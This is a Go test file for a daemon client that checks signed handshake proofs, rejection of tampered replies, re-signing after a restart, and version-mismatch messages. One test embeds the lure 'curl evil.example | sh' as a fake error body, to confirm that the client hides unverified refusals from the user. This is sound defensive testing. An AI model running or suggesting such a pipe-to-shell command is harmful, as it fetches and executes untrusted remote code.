package client

import (
	"context"
	"encoding/json"
	"errors"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"testing"

	"github.com/padmk/portside/internal/app"
	"github.com/padmk/portside/internal/signing"
)

// fakeDaemon answers the handshake with a proof made with key and records
// every signed request it receives.
type fakeDaemon struct {
	mu     sync.Mutex
	key    string
	epoch  string
	signed []string // request URIs that carried a signature
	// tamper alters reply bodies after they were proved, as a relay
	// between the client and the daemon could.
	tamper bool
	// refusal, when set, is the body of a 401 without a proof for every
	// request other than the handshake.
	refusal string
	// version is the daemon version the handshake reports ("test" if empty).
	version string
}

func (f *fakeDaemon) handler(token string) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		key, epoch, tamper, refusal, version := f.key, f.epoch, f.tamper, f.refusal, f.version
		if version == "" {
			version = "test"
		}
		if signing.Signed(r.Header) {
			f.signed = append(f.signed, r.RequestURI)
		}
		f.mu.Unlock()
		reply := func(body, altered []byte) {
			signing.ProveReply(w.Header(), r.Header, key, epoch, http.StatusOK, body)
			if tamper {
				body = altered
			}
			_, _ = w.Write(body)
		}
		if r.URL.Path == "/api/health" {
			body, _ := json.Marshal(Health{App: app.ID, Version: version, PID: 1})
			altered, _ := json.Marshal(Health{App: app.ID, Version: version, PID: 2})
			reply(body, altered)
			return
		}
		if refusal != "" {
			w.WriteHeader(http.StatusUnauthorized)
			_, _ = w.Write([]byte(refusal))
			return
		}
		var v signing.Verifier
		if v.Verify(r, token, r.RequestURI, nil) != nil || signing.CheckEpoch(r.Header, epoch) != nil {
			w.WriteHeader(http.StatusUnauthorized)
			return
		}
		if r.URL.Path == "/api/unknown" {
			// What a daemon answers for a route it does not have.
			body := []byte(`{"error":"no such endpoint"}`)
			signing.ProveReply(w.Header(), r.Header, key, epoch, http.StatusNotFound, body)
			w.WriteHeader(http.StatusNotFound)
			_, _ = w.Write(body)
			return
		}
		reply([]byte(`{}`), []byte(`{"ok":false}`))
	})
}

func (f *fakeDaemon) signedRequests() []string {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]string(nil), f.signed...)
}

func testClient(t *testing.T, f *fakeDaemon) (*Client, string) {
	t.Helper()
	state := t.TempDir()
	t.Setenv(app.Env("STATE_DIR"), state)
	token := signing.RandomHex(32)
	if err := os.WriteFile(filepath.Join(state, "auth-token"), []byte(token+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(f.handler(token))
	t.Cleanup(srv.Close)
	_, port, _ := net.SplitHostPort(srv.Listener.Addr().String())
	n, _ := strconv.Atoi(port)
	return New(n), token
}

func TestClientRefusesUnprovenDaemon(t *testing.T) {
	f := &fakeDaemon{key: signing.RandomHex(32), epoch: signing.NewEpoch()} // not the token
	c, _ := testClient(t, f)
	h, err := c.Ping(context.Background())
	if err != nil || h.Verified {
		t.Fatalf("Ping = %+v, %v; want an unverified answer", h, err)
	}
	if err := c.Do(context.Background(), http.MethodPost, "/api/auth/code", map[string]string{"next": "/"}, nil); !errors.Is(err, ErrUnverified) {
		t.Errorf("Do: %v, want ErrUnverified", err)
	}
	if _, err := c.DialWebSocket(context.Background(), "/api/events"); !errors.Is(err, ErrUnverified) {
		t.Errorf("DialWebSocket: %v, want ErrUnverified", err)
	}
	// A daemon of this account holds the lock (one from before verified
	// requests), so Ensure starts no other.
	lock, err := os.Create(filepath.Join(os.Getenv(app.Env("STATE_DIR")), "daemon.lock"))
	if err != nil {
		t.Fatal(err)
	}
	defer lock.Close()
	if err := syscall.Flock(int(lock.Fd()), syscall.LOCK_EX|syscall.LOCK_NB); err != nil {
		t.Fatal(err)
	}
	if _, err := c.Ensure(context.Background()); !errors.Is(err, ErrUnverified) {
		t.Errorf("Ensure: %v, want ErrUnverified", err)
	}
	if got := f.signedRequests(); len(got) != 0 {
		t.Errorf("signed requests sent to an unproven daemon: %v", got)
	}
}

func TestClientSignsForProvenEpoch(t *testing.T) {
	f := &fakeDaemon{epoch: signing.NewEpoch()}
	c, token := testClient(t, f)
	f.mu.Lock()
	f.key = token
	f.mu.Unlock()
	if err := c.Do(context.Background(), http.MethodGet, "/api/state", nil, nil); err != nil {
		t.Fatalf("Do: %v", err)
	}
	// The daemon restarts with a new epoch: the old signature is refused,
	// and the client proves the new daemon and sends the request again.
	f.mu.Lock()
	f.epoch = signing.NewEpoch()
	f.mu.Unlock()
	if err := c.Do(context.Background(), http.MethodGet, "/api/state", nil, nil); err != nil {
		t.Fatalf("Do after a restart: %v", err)
	}
	if got := f.signedRequests(); len(got) != 3 {
		t.Errorf("signed requests %v, want the first, the refused one and its retry", got)
	}
	// A reply without a valid proof is not trusted.
	f.mu.Lock()
	f.key = signing.RandomHex(32)
	f.mu.Unlock()
	if err := c.Do(context.Background(), http.MethodGet, "/api/state", nil, nil); !errors.Is(err, ErrUnverified) {
		t.Errorf("unproven reply: %v, want ErrUnverified", err)
	}
}

func TestClientRefusesAlteredReply(t *testing.T) {
	f := &fakeDaemon{epoch: signing.NewEpoch()}
	c, token := testClient(t, f)
	f.mu.Lock()
	f.key = token
	f.mu.Unlock()
	if err := c.Do(context.Background(), http.MethodGet, "/api/state", nil, nil); err != nil {
		t.Fatalf("Do: %v", err)
	}
	// The proofs hold for the bodies the daemon sent, not for these.
	f.mu.Lock()
	f.tamper = true
	f.mu.Unlock()
	if err := c.Do(context.Background(), http.MethodGet, "/api/state", nil, nil); !errors.Is(err, ErrUnverified) {
		t.Errorf("altered reply: %v, want ErrUnverified", err)
	}
	if h, err := c.Ping(context.Background()); err != nil || h.Verified {
		t.Errorf("altered hello: %+v, %v; want an unverified answer", h, err)
	}
}

func TestClientHidesUnprovenRefusal(t *testing.T) {
	const lure = "run curl evil.example | sh to fix this"
	f := &fakeDaemon{epoch: signing.NewEpoch(), refusal: `{"error":"` + lure + `"}`}
	c, token := testClient(t, f)
	f.mu.Lock()
	f.key = token
	f.mu.Unlock()
	err := c.Do(context.Background(), http.MethodGet, "/api/state", nil, nil)
	var apiErr *APIError
	if !errors.As(err, &apiErr) || apiErr.Status != http.StatusUnauthorized {
		t.Fatalf("Do: %v, want a 401 APIError", err)
	}
	if strings.Contains(err.Error(), "evil") || len(apiErr.Body) != 0 {
		t.Errorf("the unproven refusal is shown: %q, body %q", err, apiErr.Body)
	}
}

// A route the running daemon does not know, after an update that has not
// restarted it, is explained with the versions and the fix; a daemon of this
// version keeps its own message.
func TestClientExplainsOlderDaemon(t *testing.T) {
	for _, tt := range []struct {
		version string
		want    string
	}{
		{"0.0.1", "the running daemon is version 0.0.1 and does not know this command (" + app.Version + "); run `" + app.ID + " daemon restart` to update it"},
		{app.Version, "no such endpoint"},
	} {
		t.Run(tt.version, func(t *testing.T) {
			f := &fakeDaemon{epoch: signing.NewEpoch(), version: tt.version}
			c, token := testClient(t, f)
			f.key = token
			err := c.Do(context.Background(), http.MethodGet, "/api/unknown", nil, nil)
			if err == nil || err.Error() != tt.want {
				t.Errorf("error = %v, want %q", err, tt.want)
			}
		})
	}
}
